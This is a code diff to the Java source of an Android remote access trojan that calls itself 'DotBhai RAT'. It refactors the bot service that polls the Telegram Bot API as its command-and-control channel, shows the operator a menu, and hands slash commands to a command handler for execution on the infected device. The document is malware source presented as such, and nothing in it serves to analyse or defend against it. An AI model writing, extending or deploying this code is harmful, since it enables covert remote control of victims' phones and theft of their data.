@@ -10,8 +10,7 @@ import okhttp3.*;
 
 public class BotCommandService extends Service {
 
-    private static final String BASE = "https://api.telegram.org/bot"
-            + TelegramSender.BOT_TOKEN;
+    private static final String BASE = "https://api.telegram.org/bot" + TelegramSender.BOT_TOKEN;
     private volatile boolean running = true;
     private long lastUpdate = 0;
     private CommandHandler handler;
@@ -47,7 +46,13 @@ public class BotCommandService extends Service {
                     JSONObject msg = u.optJSONObject("message");
                     if (msg != null) {
                         String text = msg.optString("text", "");
-                        if (text.startsWith("/")) handleTextCommand(text);
+                        if (text.startsWith("/start") || text.startsWith("/menu")) {
+                            TelegramSender.sendMessageWithButtons(
+                                    "🤖 <b>DotBhai RAT</b>\nاختر:",
+                                    CommandHandler.mainMenu());
+                        } else if (text.startsWith("/")) {
+                            handler.execute(text, null);
+                        }
                     }
 
                     JSONObject cb = u.optJSONObject("callback_query");
@@ -59,20 +64,6 @@ public class BotCommandService extends Service {
                 Log.e("BotSvc", "poll: " + e.getMessage());
                 try { Thread.sleep(3000); } catch (Exception ignored) {}
             }
-        }
-    }
-
-    private void handleTextCommand(String cmd) {
-        try {
-            if (cmd.equals("/start") || cmd.equals("/menu")) {
-                TelegramSender.sendMessageWithButtons(
-                        "🤖 <b>DotBhai RAT</b>\nاختر:",
-                        CommandHandler.mainMenu());
-            } else {
-                handler.execute(cmd, null);
-            }
-        } catch (Exception e) {
-            TelegramSender.sendMessage("⚠️ " + e.getMessage());
         }
     }
 
